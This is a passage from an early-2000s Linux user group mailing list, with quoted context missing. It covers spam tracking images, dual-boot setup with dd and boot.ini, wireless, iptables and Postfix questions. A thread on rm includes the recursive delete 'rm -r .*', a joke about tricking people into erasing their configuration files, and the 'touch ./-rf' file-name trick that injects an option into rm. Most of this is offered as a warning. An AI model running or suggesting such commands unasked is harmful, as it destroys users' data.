was sent to.  In this case, me (keithl at ieee.org) so I changed the
number.  This is why it is dumb to have html viewing enabled for
email readers, because that means that when you open such an email,
the email program automatically accesses the spammer site to get
at the pictures,  and the specific picture address used provides
the confirmation that the spam email arrived and got looked at.
That counts as an "opt in", and means you will get a lot of spam
from these people.

What really frosts me is that the so-called "anti-spam" law waiting
for the President's signature not only makes this kind of fraud
legal, it makes it *illegal* to attempt to stop such spam by state
legislation or technical means.  But then, you can assume that any
legislation passed obstensibly for reason X is actually designed to
make "not-X" happen.  

So, I repeat, TURN OFF automatic html email viewing, and DO NOT LOOK
at 123greetings.com .

I think so, but I'm not sure what use is made of this
"knowledge." I wonder what kind of file bootsect.lnx
is? I'll try to examine it. That is certainly the only
thing Windows knows about Linux, since it cannot read
reiserfs partitions.

Some sensible MUAs (Evolution, Mozilla) will not load remote images from
HTML pages automatically.  Evolution has this feature by default;
Mozilla has to enable it (I don't have the Mail portion installed or I'd
tell you exactly where).

I do believe that bootsect.lnx is just name space

should be 

dd if=/dev/hdb2   of=/dev/hda1 bs=512 count=1

Try that.

/dev/hda1 is where your current MBR is.

Good Luck

Evo goes one step smarter.  It can be set to automatically load images
from people in your address book.

There are some people who I get html mail from (Airlines) that I want to
auto load the images.  And I have it!

hda1 is the first partition on hda, most likely whatever version of
Windows is installed there.

Yes. For example, if you should type 

grub-install /dev/hda1 instead of
grub-install /dev/hda

it will take a long time to recover. Returning to the
present issue, Kun Wei of Cal Tech addresses
dual-booting Redhat 7.1 and XP Pro: 

In Linux, run "dd if=/dev/hda3 of=/bootsect.lnx bs=512
count=1" providing the boot device is /dev/hda3 as
example shows 

In Linux, run "mcopy /bootsect.lnx a:" . If you don't
have mcopy, download the tools, it is in mtools (
http://mtools.linux.lu/) 

I've got it.

OK, now reboot to Windows XP Professional 
Copy A:\BOOTSECT.LNX to C:\ 
Edit C:\boot.ini, you may need to modify the file
property to change it. 
Add "C:\BOOTSECT.LNX="RedHat 7.1" to C:\boot.ini and
save. (May I call it "SuSE 9.0?")
Reboot, now you should have the menu to choose which
OS you want to boot into.
 
I think that's what I am going to try. The URL is 
http://www.its.caltech.edu/~weikun/dualboot.htm and

Subject: [PLUG] Open Office 1.1.0 on RH 9.0
Message-ID: <3FF1D237.509@pobox.com>

I installed OpenOffice 1.1.0 on RH 9.0 last night and the installation 
went fine.  But when I tested it this morning, it won't open any .doc 
files that I could open just fine with Open Office 0.9 on RH 7.3.  But 
Open Office 1.1.0 will open my old .sxw files with no problem.  When I 
try to open a .doc file I get a dialog titled "ASCII Filter Options" 
that asks me for 3 values and I just leave them set to the defaults 
because I don't know what to change them to.  They are:
Character set = "Western Europe (ISO-8859-1)"
Default fonts = "Bitstream Vera Serif"
Language = "English (USA)"
After I click Okay on this dialog, the program displays jibberish on the 
screan.  I also tried specifically selecting various Microsoft Word file 
formats, but I got the same problem.  Couldn't find any help on the Open 
Office web site or on the Internet.

I've never had a problem with Open Office in the past and I assume that 
I don't have it set up right.  Has anyone had this problem?

Red Hat 9.0 ships with an rpm for OpenOffice 1.0.2.  Has anyone had 
success using Open Office 1.1.0 (especially opening doc files) on RH 9.0?

Not a big problem. If you don't specify a runlevel in inittab,
the init program will prompt you for a runlevel when it starts.

I've used Window2000  before like this and it works. You can use any
name you want in the menu.

If you are installing SUSE 9.0, SuSE9.0 will resize ntfs, fat 32, and
fat 16 partitions to your specification at install, if you need to room
for Linux. No more hunting for someone with a Windows partition resizing
tool.

It will also install grub in such a way that you can boot windows. It
does this with out you having to know how, very friendly install. If you
are using kde, SuSE 9.0 will also set up links on your desktop so that
you click and mount you windows partition. This is read only access
however.

Being a linux user means you're a thinker, so you probably set
up a fat 32 partition when you were doing your install so that you could
drop files from linux into it for when you boot into windows. SuSE will
also pick up this partition and create the links on the kde desktop for
you

There is http://p-nand-q.com/download/rfstool.html if you don't want to
do the fat 32 partition and are using the default reiserfs file systems
SuSE installs. I haven't used this so don't know how will it works. 

Now you have a dual boot where you can easily get to files you need.

Thank you
Russell

No -- much more subtle -- tell someone to erase all their custom

MWUHAHAHAHAHAHAHAHAHAHAHAHAHAHA

(I'm not laughing at erasing configuration settings, btw.)

  Chuckle away, but I accidently erased all the dot-files in my home
directory severalt years ago. After that uncomfortable, sinking feeling in
my gut went away I got the last week's full backup tape and restored them
all, then followed up with any incremental, daily backups. About a half-hour
later I was back in business. Wiser, too. That's when I made an alias for
'rm' that forces me to confirm each one.

No -- you fail to understand the dire consequences of rm >-r< .*

Work out all the files in a directory beginning with ".". Then think
about what a recursive delete would do. Then understand why I said I
wasn't laughing at the configuration files in the slightest. (In fact,
it probably won't get a chance to get around to deleting the actual
configuration files ;)

If you ever really do need to do that -- rm -rf .??* is safer.

Isn't there a safeguard against this now?

jbrelin at loyale:~$ strings /bin/rm|grep "cannot remove \`"
cannot remove `.' or `..'

So what invokes this, exactly?

Message-ID: <3FF1EA29.5070300@spek.org>

Hello,
   I've been using XMMS to play my mp3/ogg files, and it's worked fine 
until lately when I've been streaming them to myself over http - they 
play fine but I can't seek within a track.  I know this is possible 
since WinAmp seeks within my streams just fine - are there any Linux 
players that do too?

thanks,

Not too much wiser, though...

aliasing rm to 'rm -i' is a big mistake.  I used to think it was smart to
do until I sat down at a system where it wasn't aliased and realized how
lazy it had made me.  And the relationship between -i and -f and how they
interact with each other really depends on implementation and might change
from one version to another.  It could be that GNU rm always does it the
same way, but the rm on Solaris didn't handle it the same way at all.
(And I'm not totally convinced that GNU rm is going to do it the same way
from version to version.)


In a sense, aliasing rm is kind of an example of Larry Wall's "false
laziness".  It seems like nice shorthand, but ends up costing you huge
later.

What one SHOULD learn from an rm error like you describe is to be very
careful with rm, not find some way to be more careless.

But you won't read this anyway... maybe somebody else will get something
out of it.

I think FreeAMP will do that.

I kinda thought XMMS did, though...

Have you tried mplayer?

The thing that it taught me is that there is an non-printing [pause]
character followed by the non-printing [think] character in that
command before you press Enter.

Well, now there is. At least under Redhat 9 and SCO 5.
So probably for quite some time.  However, it wasn't always so.

Subject: [PLUG] hey, you really _should_ reboot after repartitioning!
Message-ID: <86n09ac66j.fsf@coulee.tdb.com>

I was upgrading harddisks in my mail server last night.  I used cfdisk
and partitioned into three hda1, hda2, hda3, got the usual warning
about rebooting, which I usually ignore without damage.  hda2 was
intended for swap, hda3 as /aux where I was planning to plant /home.
I mke2fs'd hda3, copied a swath of home directories from hda1 to hda3.
This seemed to go fine, so I nuked the source home from hda1.  Then I
remembered to create the swap with "mkswap /dev/hda2".  I saw an
annoyingly large swapsize (like 20gig or something I never quite
parsed, a 2 followed by an unnerving and obviously erroneous number of
additional digits).

I rebooted and after a short interval discovered that I couldn't
slogin to the machine.  No home directory.  Oops.  The hda3 filesyste
hadn't been mounted.  Tried to mount.  Toast.  Luckily, I had the old
disk intact, so it was just another copy from it to the new /home
tree, however I did lose about an hour of mail deliveries.  Checking
/var/log/mail.log, it only amounted to a couple of messages to
mostly-unread mailing lists and a pile of spam, so not too much
damage.

Remember the non-printing [pause] and [think] characters after "rm -rf"!

... and remember to reboot after repartitioning! ;-)

Exactly as you said -- e.g., defanging a compromised configuration
environment in the root homedir on a Solaris system where such
safeguards aren't present. ;-) Or using older GNU rm's.

Subject: [PLUG] Getting ad-hoc wireless connection going...
Message-ID: <1072824384.24761.17.camel@goose.robinson-west.com>

I have a ZEW1300 made by Zonet and an SMC EzConnect 2632W 
in supplied pcmcia to pci adapter.  The SMC card is on a 
7.3 Redhat system with wireless tools 16 and kernel 2.4.23,
the Zonet card at the moment is on a 98SE system.  I can't 
get them to connect ad-hoc.

The Redhat documentation suggests using X configuration 
tools which  I don't have because I didn't install X.  

Does anyone know if these two cards can connect ad-hoc?
It appears that the SMC card will not run in Master mode
acting as an access point, but I guess this isn't
necessary.

I can ping the wireless card itself on each machine and
I have the two cards on the same channel, channel 4.  

How do I set up WEP using wireless tools 16?
Why is overwriting ./usr/include/wireless.h before
compiling and installing new wireless tools 
recommended?  At least I got rid of the you are 
using version 12 on a kernel compiled for version
16 errors.

Is hard setting the ip 192.168.3.1 on one card and 192.168.3.2
on the other the way to go, or do these cards need to be on
different subnets?  Is there a special point to point route
that needs to be added?

Are the pcmcia cards with built in antenna oriented directly
up and down?  How about the plastic screw in pigtail that comes
with the Zonet 1300?  I'm wondering if the antennas aren't aimed 
right.  Do I want to select ad-hoc in the Windows utility and
ad-hoc under wireless utilities on the Redhat box?

`touch ./-rf`

Now remove it. Depending upon the `rm` you may very well accidentally
remove everything. Don't alias rm, as mentioned by others, use it
carefully.

yeah, making idiosyncratic changes to universal tools is a
mistake.  it's better to give an 'rm -i' alias your own name,
like 'del', and train yourself to type 'del' all the time, which
is not that different from training yourself to type 'rm -i' all
the time.

Yeah, some smart-alek bad-programmer wannabe fellow at a job I had tried
to befuddle us by putting files called "*" in all of his directories
thinking we'd be daft enough to blow everything away while cleaning up
cruft.

Fact was, we wanted to blow it all away anyway because everything he did
had to be rewritten anyway.

He was one of those guys who purposely writes spaghetti code with
worthless variable names as an attempt at job security.  Needless to say,
it didn't work... probably backfired, in fact.

Unfortunately, it still works most places... in fact, every contract I get
has at least one permanent guy who works an hour a month or something, but
can't be fired because he's the only one that has ever managed some dumb
system.  Usually said dumb system can be replaced with a perl script.
Oddly enough, it's these kind of practical solutions that make me an
undesirable contractor.  See, IT directors get VERY worried when you start
talking about decreasing their staff.  If you point out incompetence,
you're asking them to tell their boss that incompetence was going on under
their nose.  They don't like that.

Pardon the Robinsonian rant.

Dunno if you can still get them (try eBay?), but the
Lucent/Orinoco/whoever-they-are-this-month's RG-1000 is a nice gateway
and has a built-in analog modem.

There are two ad-hoc modes in Windows try the one that isn't configured

http://hostap.epitest.fi/  this replaces the prism2_plx or prism2_pci
hostap_plx or hostap_pci and allows the SMC EzConnect 2632W to act as an
AP. There is hostapd also to do 802.1x authentication if you get the
wireless working.

if you have 192.168.3.0 on any other interfaces then it won't work,
assuming /24 netmask. The wireless network needs to be on its own
segment. You should then have the correct route setup or add a
route that has wlan0 as the route for 192.168.3.0.  Setting a static
route to the other wireless card can be done if you wish.

iwconfig interface mode adhoc on Linux
use whatever gui in Windows, remember there are two ad-hoc modes in
Windows so try both. 

The antenna are omni directional. If the machines are within a few feet
of each other then you should be OK.  iwevent might be helpful on the
linux box. Maybe one of the wireless wardriving or is it warchalking,
whatever, tools on windows will support the card on windows, and provide
you with so information to help you figure this out.

Thank you

Actually, I've read that it's more like -- reduction in staff ==
reduction in budget/clout against other departments in the
company. And that, in fact, many IT directors *want* more staff, even
if they do nothing. An image of incomptence is certainly unhealthy,
but you can play that card against the marketing department just as
easily. ;-)

I've read that, too, but it doesn't really bear out in real life, in my
experience.

Staff == budget, certainly, but it's wasted budget if it's useless staff.
In my experience, the department that shows frugality gets the project
funds it requests more readily than the big department full of wasted
funds.

I really think it's a matter of not doing anything the contractor says
because it would show that the staff was not capable of doing it
themselves.

Whenever I hear, "Sounds good, we just have to run it past the head of
that department."  I just shrug and walk away.  They NEVER go with your
recommendations because they didn't think of it themselves.  Job security
is all about stifling innovation.

Hmm... I wonder if someone could put together a coherent economic theory
in which any supply-driven economy stifles innovation.  Wait, I guess
that's just a trivial extension of the idea that innovation is stifled
when power is concentrated in the hands of the few.

But, to digress a bit, yeah, I think radical changes are avoided because
they show the leadership has been failing for some time to keep ahead of
the curve.

The organizations that need external help most are the least likely to
take the advice of external helpers.

True. Any company large enough to have politics as I discussed is not
likely to bring in contractors, except for large turn-key
solutions. (Like backup or SAP or so on.)

Let me start by saying SORRY! to all those who take
offense at M$ stuff and being OT.....

Its for my mom, what can I say....

I got my mom a new comp for xmas.  I exported all the
emails and such from her old drive, imported to the
new install on the new drive, (both win2k pro), and
now the attachments to the emails are not there.  The
old drive is slaved in the system, and is completely
intact(bootable if mastered).  I would boot that
drive, but the last time I swapped a win2k drive among
machines it wasnt very pretty at all....

I was wondering if anybody knew a way to extract the
messages + attachments from the old drive without
exporting them from the old system.  the new system is
running office 2k2 and the original one was office 2k.
 Any help would be soo much appreciated!  

Once again, sorry for the OT post, but thank you
again. 

John

To manage the silly thing ... e.g. traffic monitoring, WEP key
configuration, MAC filtering lists, network identification.
Bridge management can be done via serial port, SNMP, Telnet,
web page, a proprietary protocol, ...  At least three of these
require an IP address.

I think the attachments are still there.  I see (from the
next paragraph) that you've upgraded Outlook.  (This can
also happen if you go to the MS-Office Updates site and apply
all the Office2000 security patches, too.)

Most install programs do this too, but I have found it to be necessary
to reboot before creating any file systems on a repartitioned disk.  Was
this a freshly created partition table, or was the drive already
partitioned?

Ouch, the times I've been bitten have usually been when changing from
the M$ version to the linux version.

Well, if you believe that..

At work they upgrade to secure exchange..

Now I can't get my mail from work..

Mozilla 1.5 won't connect to the secure server.

I don't know the magic to get Mozilla to go 128 bit??

Any clues..

TIA

Yeah, it's the one still widely available AFAIK see it here 
<http://www.apple.com/airport>
no mention of a Linux config tool, but in this case XP support is good 
enough--it's not for me.

Dunno why a web interface isn't standard these days.

Mozilla goes 128 bit really easy... unless your distro stripped it for
whatever reason?  It's just like other browsers in this sense.

The real problem is probably in the company's setup of the server... it
is probably set to detect your browser version (rather than wether or
not it is actually 128-bit capable) and compare it to their list of
known good browsers they know are 128-bit encryption capable.  Namely,
Microsoft IE and Netscape Navigator.

I had a similar problem some time back with KWJJ's website (they have
since fixed it).  My browsers were all more than capable of viewing the
website, but the webmaster decided only IE 4.x+ or Netscape 4.x+ were
able to view the website, blocking everybody else out... regardless of
the fact the rendering engines between Netscape 6.1 and Mozilla 1.0 were
virtually identical... if anything, Mozilla's being superior.  Repeated
emails to them seemed to fall on deaf ears.  I recently popped back and
saw I was able to now properly access the site.  Yippeeee.

Subject: [PLUG] Trouble accessing files on CD-R media
Message-ID: <3FF24C94.90506@comcast.net>

Hello,

I am using Mandrake 9.0.
I am using Gnome.
cdrom is a DVD-ROM drive ( could be a Sony device too, I don't know for 
sure).
cdrom 2 (CD-RW)  is a Sony CD-RW CRX160e

/etc/fstab has these settings for the cdrom drives:
/dev/hdc /mnt/cdrom iso9660 iocharset=iso8859-1,codepage=850,noauto 0 0
/dev/scd0 /mnt/cdrom2 iso9660 iocharset=iso8859-1,codepage=850,noauto,ro 0 0


Here is my problem: I put a disc into either drive. Drive spins up. I 
open Nautilus to view the contents of the disc. I see the directories, 
and can open them and view the files. I try to access ( copy the file or 
load it into an application)  a file: It disappears from view in Nautilus.

( I am trying to access mp3 files archived on CD-R. )

I went into the Mandrake Control Center and modifed the mount points 
options to try the supermount option, but that did not help. Plus, I 
don't know what setting from the control center (or in fstab) to change 
my setting to.

Any suggestions??

Okay, I must first comment that it CAN be safe to reformat a hard disk
under Linux after repartitioning, without rebooting the computer.  I'll
try to explain the different scenarios and which are allowed under
Linux, and why:

1. I want to partition and format a hard disk that is in my computer,
and NO PARTITIONS of this hard disk are CURRENTLY MOUNTED.  It IS SAFE
to partition and format this hard disk without rebooting.

2. I want to partition and format a hard disk that is in my computer,
and ONE OR MORE PARTITIONS of this hard disk are CURRENTLY MOUNTED.  It
IS NOT SAFE to partition and format this hard disk without rebooting. 
You should reboot the computer, or unmount all partitions on the the
hard disk and repartition.

...Basically if you have any mounted partitions on the hard disk you
repartitioned, you should reboot the system before formatting. If no
mounted partitions then it should be safe.

Reason:  When partitioning, the partition table gets written back to the
hard disk.  Linux then tries to re-read the new partition table back
from the hard disk but fails because the hard disk is currently being
used.  Linux then keeps using the old partition scheme before you
repartitioned.  This includes all partition boundaries (where each
partition starts and stops).  That is why you overwrote you your home
directory.

Cheers,

Daniel

The AirPort (at least the earlier ones--not sure about the current) is
the same hardware as the RG-1000 in a different shell.

They're probably requiring NTLM authentication, which is in the 1.6

I don't see why it should fail to read.  Here's what the manpage for
fdisk says:

  A sync() and a BLKRRPART ioctl() (reread partition table from disk)
  are performed before exiting when the partition table has been
  updated.  Long ago it used to be necessary to reboot after the use
  of fdisk.  I do not think this is the case anymore - indeed,
  rebooting too quickly might cause loss of not-yet-written data. Note
  that both the kernel and the disk hardware may buffer data.

Here's what the manpage for cfdisk has to say:

  If you enter `yes', cfdisk will write the partition table to disk
  and the tell the kernel to re-read the partition table from the
  disk.  The re-reading of the partition table works is most cases,
  but I have seen it fail.  Don't panic.  It will be correct after you
  reboot the system.  In all cases, I still recommend rebooting the
  system--just to be safe.

Hmm.  I am guessing here that it isn't that it can't _read_ the data,
it's that it can't update the kernel data structure because it is in
use when a partition is mounted.  See blkdev_reread_part() in the kernel's
drivers/block/ioctl.c.  Not quite sure what bd_sem is protecting, but
it seems likely to be involved.

gftp works pretty well, though getting the sftp settings correct can
be a bit frustrating:

After setting the host, port (typically 22 for sftp), user, and
password -- then set the protocol-selection menu to SSH2.

Then, mouse your way to FTP -> Options and

* [optional] In the Network tab, set Default Protocol to SSH2.

* In the SSH tab, check the "Use SSH2 SFTP subsys" box. Uncheck the
  "Enable old SSH protocol" box.

I always just create permission levels in the cups.conf file and set a
user or two to have access.

Unless you're running cups behind ssl, you probably don't want to use the
root user with its real password to login.  While it usually defaults to
ignoring remote connections, it's still a networked application.

Create user level permissions and explicitly restrict network
accessibility in the configuration file.  That's just the right thing to
do.

I use gftp already, and I like it. Now I know that the ssh portion works
well, too. 

Thanks for the tip on the settings, that wouldn't have been intuitive

Subject: [PLUG] IPTABLES and protecting win2k boxes...
Message-ID: <1072902673.28881.103.camel@goose.robinson-west.com>

Does anyone know of a definitive reference to the ports 
under Windows 2000 focused on how to program an iptables 
masq box to block outbound packets  associated with DCOM, 
the ports abused by blaster, and other Windows specific 
services that should not go beyond a local LAN?  Using 
Zonealarm on an inside machine is a major pain, it seems 
to be intended for machines with direct net connections 
only.

What I'd prefer under Windows 2000 is iptables filtering.
I'm thinking deny all packets whose destination is not local
followed by explicit allow rules.  Trying to put this in
the gateway firewall seems ugly at best.  Figuring out how
to allow individual users to create their own firewall for
what can leave their machine and go through a masq gateway
that connects to the Internet makes a lot of sense.  The
standard masq rule I've seen for a gateway is masq anything 
from inside destined to a remote destination.  Packets that 
shouldn't go out should be stopped at the workstation that 
is trying to send them.

I've got netbios requests, etc., showing up in my logs from 
outside my network, how can I block these requests and keep 
them out of my logs?  Is there something like pflogsumm
that I can use to create and email reports of packet 
statisitics that will contain symbolic service names,
port numbers, packet counts, and total byte counts for 
each workstation?  With a report of everything that 
goes out in a usable summary, it would be easier to
catch an obscure Windows service being open and getting 
out through one of the masq gateways.

How does one know for example that 7070:7071 is a port range 
for Realaudio or that 2345 can be used for a custom service?  
I know ports 0 through 1024 are priviledged, but aside from 
maintaining a standard Linux password file revealing what 
ports are standard for some priviledged services, where 
can I get a definitive list of port 0 to port 1024 and
the unpriviledged port ranges that are connected to 
various services?



rule (a)
iptables -A FORWARD -i $OUT_INT_1 -o $IN_INT_1 -m state \
         --state ESTABLISHED,RELATED,NEW -j ACCEPT

What exactly does the above rule do?
Why is the above rule needed for masquerading?

rule (b)
iptables -A FORWARD -m state --state NEW,ESTABLISHED \
 	            --in-interface $IN_INT -s $ip \
                    -j bad_desti

The $bad_desti jumps to a custom chain that blocks input 
to forbidden ip addresses.  It seems to be necessary to 
jump to this in FORWARD instead of INPUT.  Should rule (a) 
be rewritten as multiple rules for individual
hosts?  Rule (a) appears to allow responses back where 
responses to a specific host should be rejected 
if a request to turn Internet access off to that 
host is serviced.

rule (c)
iptables -A FORWARD -m state --state ESTABLISHED,RELATED \
                    --in-interface $OUT_INT_1 \
                    -s ! $INTRANET_1 -j ACCEPT

Is rule (c) meant to allow secondary etc. packets of establish
masq connections though?  Should this rule be replaced with an
ip specific one?

Should rule (a) be replaced with an ip specific one
if I use a CGI script to enable and disable Internet access
for individual hosts?  I already add and delete based
on requests from a CGI script instances of rule (b) 
and matching instances of a similar rule to it where the 
only difference is that $bad_desti is ACCEPT.

rule (d)
iptables -A POSTROUTING -t nat --out-interface $OUT_INT_1 \
                        -j MASQUERADE

Does rule (d) need any changes or do I block all packets
that shouldn't reach this rule with FORWARD rules?

For a list of forbidden Internet addresses is it sufficient
to only have rules that block input to them or should I block 
input from them as well?  How about connection requests?  
How about output?  How does MSN block certain web sites
based on abstract content specifiers such as appropriate
for kids, etc?  Are there databases of web site ratings
that are trustworthy and downloadable to program iptables
firewalls with?

Sorry about the length :-)

Google for windows ports.

I see it as elegant and effective. It focuses security admin

You must have Windows users that have more technical knowledge

this would work well.

You need to see more secure setups.

I don't think this is realistic - especially with Windows.
If we could do this, we wouldn't need firewalls.

What makes you think they're not blocked?
With iptables, you have some control of what's sent to the logs.
If you want more control, send the stuff to a named pipe and
apply your own filter.

Have you tried the same disks on a different computer? With this much trouble,

Subject: [PLUG] Postfix aliases...
Message-ID: <1072906815.28880.159.camel@goose.robinson-west.com>

Can individual users have an aliases file in their home directory?  
I want to allow individual users to create their own aliases to 
their mail accounts.  

I want to block sending mail offsite with a source address 
"local user name"@"localdomainname."  

Assuming alias files in home directories are possible...
For users to create their own aliases, I need to verify 
alias files they create so that they can only create aliases 
to the mail account they own.  I also need to make sure 
that aliases they request don't collide with the requests 
of other users.  I prefer a do it yourself solution.  

Another option is to put an admin controlled alias file in
each user's home directory that contains the aliases for 
that user and then have users IM admin with their new alias 
requests.

A third option is writing a C program to maintain an alias 
database and update the alias file.  The query server can 
be perl with EasyTCP interfaced to the C program either
through text files or calling the C program through command
line args.  Probably don't need a daemon.  If I go to the
trouble of an alias database I should probably maintain a
list of discarded aliases to avoid having abused aliases
getting reused too soon.

After aliases files are changed, does Postfix have to be restarted 
for the changes to be applied?

If I implement imap, I should probably have a local website where
a user can request to see all of his/her aliases.

I'm looking at my current gftp configuration and not seeing "Enable old
SSH protocol" so I'm thinking you are using an older version. 

2.0.15
Removed legacy SSH protocol. THe SSH2 protocol is now the only SSH
protocol  supported. You had to enable an option in 2.0.14 to be able to
use this  protocol.

I could have sworn there was a exploit in <.15 but I can't find any
information about it. 2.0.16 is much much better than any previous
version and I would recommend upgrading just for the happiness factor. 
pre .14, I think, doesn't have large file support also. 


Thank you
Russell

Right you are: I'm using 2.0.14. That's the latest version shipped by
Red Hat and Fedora. I see that Debian testing has 2.0.16. I'll give it
a try. Thanks for the tip.

Um, this "third option" is a very specific implementation of the real
"third option"; namely, "Write a program to handle the aliases files".

There are a billion ways to do it.  I think you've touched on one of the
most complicated and convoluted ways that people regularly use.

> Maybe you should attend my firewall class.

Is it available online?

I have a user that wants to firewall on his workstation.  
It wouldn't hurt to have iptables on a Windows box 
duplicating rules on the gateway.  On the other hand, 
if I can fix the gateway firewalls I can show that a 
local firewall isn't needed.  I don't think it's impossible 
to write a firewalling tool that an ordinary windows user 
can use affectively, Zonealarm is simply not implemented for 
a workstation inside a masqueraded lan.  

The firewall I started with for a gateway in Securing and 
Optimizing Redhat Linux the Ultimate Edition appears to be 
designed to deny everything while explicity allowing certain 
things in from outside, but not for keeping packets inside 
a lan that shouldn't go out.  I wonder some about the flags 
on some of the rules and what the flags are in packets.  I've
actually done quite a bit of modularization of the Gerhard
firewall and have tried to break client and server rule sets
into seperate files placing them in their own chains.
The goal being to have a short section in the init script
itself where I only source the rules I want to, kind of
a one sentence says on or off idea.  Make it easier to see 
what is allowed and not allowed quickly.  I left icmp and
anti spoofing rules in the main script, but I still put 
them into their own chains.  I assumed with the Redhat 7.x
filesystem layout that the files that get sourced should be
under /etc/sysconfig/iptables.

Another problem I've run into is how to virus/trojan/worm 
filter on a Linux box for email that a Windows box will be 
exposed to.  I want to configure postfix to force everything 
through an affective filter before doing anything else with 
it whether the mail is incoming or outgoing.

Is there a trick when you hand out two gateways in ISC dhcp 3 
to give them different metrics?

As far as the anonymous part, just call me Mr.Underhill.

If I were at home, I could give you a good URL that explains why
"personal firewalls" are mostly snake oil.  No matter how you cut it,
no matter how much you tweak it, Microsoft has proved to the world
once and again that Windows is not to be trusted in any way, shape or
form on a hostile network.

Just set up a router, only allowing related and existing connections
to enter from the outside.  Go hit telnet://dyna.multcolib.org/ and
reserve yourself Teach Yourself Linux Security Basics in 24 Hours.
This is a good primer if you're not used to securing a system.

Of course, if you really want to secure Windows the right way, don't
use Windows at all.
